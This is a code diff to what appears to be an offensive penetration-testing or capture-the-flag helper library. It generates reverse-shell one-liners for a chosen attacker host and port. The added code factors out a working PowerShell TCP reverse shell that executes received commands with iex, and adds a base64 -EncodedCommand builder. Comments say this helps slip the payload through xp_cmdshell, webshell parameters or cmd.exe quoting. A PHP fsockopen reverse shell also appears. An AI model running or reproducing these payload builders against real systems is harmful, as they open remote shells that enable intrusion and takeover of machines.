@@ -10,6 +10,14 @@ export const SHELL_PAYLOAD_KINDS: { id: ShellPayloadKind; label: string }[] = [
   { id: "powershell", label: "PowerShell" },
 ];
 
+function powershellScriptBody(lhost: string, lport: string): string {
+  return `$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});` +
+    `$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){` +
+    `$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);` +
+    `$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);` +
+    `$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`;
+}
+
 // Standard, widely-published one-liners (pentestmonkey-style cheat sheet) —
 // getting one of these onto the RCE point (webshell param, command
 // injection, upload) is close to universal across every box, so this is
@@ -30,14 +38,33 @@ export function buildReverseShellPayload(
     case "php":
       return `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`;
     case "powershell":
-      return `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});` +
-        `$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){` +
-        `$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);` +
-        `$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);` +
-        `$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`;
+      return `powershell -nop -c "${powershellScriptBody(lhost, lport)}"`;
     default:
       return "";
   }
+}
+
+// PowerShell's -EncodedCommand takes the script as UTF-16LE bytes, base64'd
+// -- charCodeAt() already yields UTF-16 code units (surrogate pairs
+// included), so each one just needs to land as two little-endian bytes.
+export function toPowerShellEncodedCommand(script: string): string {
+  const bytes = new Uint8Array(script.length * 2);
+  for (let i = 0; i < script.length; i++) {
+    const code = script.charCodeAt(i);
+    bytes[i * 2] = code & 0xff;
+    bytes[i * 2 + 1] = (code >> 8) & 0xff;
+  }
+  let binary = "";
+  for (const byte of bytes) binary += String.fromCharCode(byte);
+  return btoa(binary);
+}
+
+// A quoted `-c "..."` payload nested inside another quoted context (SQL's
+// xp_cmdshell 'powershell -c "..."', a webshell param, cmd.exe) breaks as
+// soon as one of those layers re-escapes the inner quotes. -EncodedCommand
+// sidesteps the whole problem: no quotes left to collide with anything.
+export function buildPowerShellEncodedPayload(lhost: string, lport: string): string {
+  return `powershell -nop -enc ${toPowerShellEncodedCommand(powershellScriptBody(lhost, lport))}`;
 }
 
 export type WebshellFileKind = "php" | "aspx" | "jsp";
